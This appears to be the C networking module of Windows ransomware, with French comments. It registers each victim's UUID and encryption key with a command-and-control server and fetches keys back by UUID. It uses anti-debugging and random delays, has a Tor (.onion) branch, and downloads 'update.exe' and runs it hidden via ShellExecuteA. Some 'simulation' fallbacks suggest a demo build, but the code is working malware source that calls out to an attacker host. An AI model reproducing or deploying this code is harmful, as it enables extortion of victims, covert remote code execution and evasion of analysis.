#include "main.h"
#include <shellapi.h> // Ajout de l'en-tête pour ShellExecuteA

// POST HTTP pour envoi des informations à C&C
int HTTP_POST(const char *uuid, const uint8_t *key, size_t key_len) {
    printf("Envoi POST avec UUID: %s\n", uuid);

    AntiDebug();
    RandomDelay();

    char key_b64[100];
    sodium_bin2base64(key_b64, sizeof(key_b64), key, key_len, sodium_base64_VARIANT_ORIGINAL);

    char json[256];
    snprintf(json, sizeof(json), "{\"uuid\":\"%s\",\"key\":\"%s\",\"version\":\"%s\"}",
            uuid, key_b64, VERSION);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        printf("Erreur: WinHttpOpen failed (%lu)\n", GetLastError());
        return 0;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_URL, SERVER_PORT, 0);
    if (!hConnect) {
        printf("Erreur: WinHttpConnect failed (%lu)\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return 0;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/register", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        printf("Erreur: WinHttpOpenRequest failed (%lu)\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 0;
    }

    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/json", -1L, WINHTTP_ADDREQ_FLAG_ADD);

    // Mode simu si pas de serveur dispo
    BOOL success = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, json, strlen(json), strlen(json), 0);
    if (!success) {
        printf("Attention: WinHttpSendRequest failed (%lu) - Simulation success\n", GetLastError());
        success = 1; // Force success pour démo
    } else {
        success = WinHttpReceiveResponse(hRequest, NULL);
        if (success) {
            DWORD status_code;
            DWORD status_size = sizeof(status_code);
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &status_code, &status_size, NULL);
            printf("POST /register: status %lu\n", status_code);
            success = (status_code == 200);
        } else {
            printf("Attention: WinHttpReceiveResponse failed (%lu) - Simulation success\n", GetLastError());
            success = 1; 
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}

// GET HTTP pour récupérer la clé
int HTTP_GET(const char *uuid, uint8_t *key, size_t key_len) {
    printf("Envoi GET avec UUID: %s\n", uuid);

    RandomDelay();

    wchar_t path[256];
    wchar_t w_uuid[256];
    MultiByteToWideChar(CP_UTF8, 0, uuid, -1, w_uuid, 256);
    swprintf(path, 256, L"/key/%s", w_uuid);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        printf("Erreur: WinHttpOpen failed (%lu)\n", GetLastError());
        return 0;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_URL, SERVER_PORT, 0);
    if (!hConnect) {
        printf("Erreur: WinHttpConnect failed (%lu)\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return 0;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        printf("Erreur: WinHttpOpenRequest failed (%lu)\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 0;
    }

    // Mode simu pour tester
    BOOL success = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!success) {
        printf("Attention: WinHttpSendRequest failed (%lu) - Simu récupération clé\n", GetLastError());

        // Pour la simu, copier direct la clé
        memcpy(key, g_key, key_len);

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1; // Simu success
    }

    success = WinHttpReceiveResponse(hRequest, NULL);
    if (success) {
        char buffer[1024];
        DWORD bytes_read;
        if (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytes_read)) {
            buffer[bytes_read] = '\0';
            printf("Réponse serveur: %s\n", buffer);

            char *key_b64 = strstr(buffer, "\"key\":\"");
            if (key_b64) {
                key_b64 += 7; // Sauter après "key":"
                char *end = strchr(key_b64, '"');
                if (end) {
                    *end = '\0';
                    printf("Clé extraite: %s\n", key_b64);
                    size_t decoded_len;
                    if (sodium_base642bin(key, key_len, key_b64, strlen(key_b64), NULL, &decoded_len, NULL, sodium_base64_VARIANT_ORIGINAL) == 0) {
                        printf("GET /key/%s: clé récupérée\n", uuid);
                        success = 1;
                    } else {
                        printf("Erreur: échec décodage base64\n");
                        success = 0;
                    }
                }
            } else {
                printf("Erreur: clé non trouvée dans la réponse\n");
                success = 0;
            }
        }
    }

    // Si serveur down, simulation
    if (!success) {
        printf("Attention: Communication serveur échouée - Simu récupération clé\n");
        memcpy(key, g_key, key_len);
        success = 1;
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}

// POST HTTP sécurisé avec chiffrement supplémentaire
int SecureHttpPost(const char* url, const char* data, char* response, size_t response_size) {
    uint8_t key[crypto_secretbox_KEYBYTES];
    uint8_t nonce[crypto_secretbox_NONCEBYTES];
    randombytes_buf(key, sizeof(key));
    randombytes_buf(nonce, sizeof(nonce));

    size_t data_len = strlen(data);
    size_t cipher_len = data_len + crypto_secretbox_MACBYTES;
    uint8_t* cipher = (uint8_t*)malloc(cipher_len);

    crypto_secretbox_easy(cipher, (uint8_t*)data, data_len, nonce, key);

    char* cipher_b64 = (char*)malloc(cipher_len * 2);
    sodium_bin2base64(cipher_b64, cipher_len * 2, cipher, cipher_len, sodium_base64_VARIANT_ORIGINAL);

    char payload[8192];
    char nonce_hex[crypto_secretbox_NONCEBYTES * 2 + 1];
    sodium_bin2hex(nonce_hex, sizeof(nonce_hex), nonce, crypto_secretbox_NONCEBYTES);

    snprintf(payload, sizeof(payload),
            "{\"nonce\":\"%s\",\"data\":\"%s\"}",
            nonce_hex, cipher_b64);

    int result = 0;
    if (strstr(url, ".onion")) {
        SimulateTorConnection(payload, response, response_size);
        result = 1;
    } else {
        wchar_t wurl[1024];
        MultiByteToWideChar(CP_UTF8, 0, url, -1, wurl, 1024);

        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (hSession) {
            HINTERNET hConnect = WinHttpConnect(hSession, SERVER_URL, SERVER_PORT, 0);
            if (hConnect) {
                HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wurl,
                                                     NULL, WINHTTP_NO_REFERER,
                                                     WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
                if (hRequest) {
                    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/json",
                                          -1L, WINHTTP_ADDREQ_FLAG_ADD);

                    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                        payload, strlen(payload), strlen(payload), 0) &&
                        WinHttpReceiveResponse(hRequest, NULL)) {

                        DWORD bytes_read = 0;
                        if (WinHttpReadData(hRequest, response, response_size - 1, &bytes_read)) {
                            response[bytes_read] = '\0';
                            result = 1;
                        }
                    }
                    WinHttpCloseHandle(hRequest);
                }
                WinHttpCloseHandle(hConnect);
            }
            WinHttpCloseHandle(hSession);
        }
    }

    free(cipher);
    free(cipher_b64);

    return result;
}

// Vérification et téléchargement de mises à jour
int CheckForUpdate(const char* current_version) {
    char response[8192];

    wchar_t url[256];
    swprintf(url, 256, L"/update/check");

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                  WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
if (!hSession) return 0;

    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_URL, SERVER_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return 0;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", url,
                                         NULL, WINHTTP_NO_REFERER,
                                         WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 0;
    }

    BOOL success = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                   WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (success) {
        success = WinHttpReceiveResponse(hRequest, NULL);
        if (success) {
            DWORD bytes_read = 0;
            if (WinHttpReadData(hRequest, response, sizeof(response) - 1, &bytes_read)) {
                response[bytes_read] = '\0';

                char* version = strstr(response, "\"version\":\"");
                if (version) {
                    version += 11;
                    char* end = strchr(version, '"');
                    if (end) {
                        *end = '\0';

                        if (strcmp(version, current_version) > 0) {
                            printf("Nouvelle version dispo: %s\n", version);

                            wchar_t update_url[256];
                            swprintf(update_url, 256, L"/update/download/%S", version);

                            HINTERNET hUpdateReq = WinHttpOpenRequest(hConnect, L"GET", update_url,
                                                                  NULL, WINHTTP_NO_REFERER,
                                                                  WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
                            if (hUpdateReq) {
                                if (WinHttpSendRequest(hUpdateReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                                   WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                                    WinHttpReceiveResponse(hUpdateReq, NULL)) {

                                    char temp_path[MAX_PATH];
                                    GetTempPathA(MAX_PATH, temp_path);
                                    strcat(temp_path, "update.exe");

                                    FILE* f = fopen(temp_path, "wb");
                                    if (f) {
                                        DWORD update_bytes_read;
                                        char buffer[8192];

                                        while (WinHttpReadData(hUpdateReq, buffer, sizeof(buffer), &update_bytes_read)
                                              && update_bytes_read > 0) {
                                            fwrite(buffer, 1, update_bytes_read, f);
                                        }

                                        fclose(f);

                                        ShellExecuteA(NULL, "open", temp_path, NULL, NULL, SW_HIDE);
                                        WinHttpCloseHandle(hUpdateReq);
                                        WinHttpCloseHandle(hRequest);
                                        WinHttpCloseHandle(hConnect);
                                        WinHttpCloseHandle(hSession);
                                        return 1;
                                    }
                                }
                                WinHttpCloseHandle(hUpdateReq);
                            }
                        }
                    }
                }
            }
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 0;
}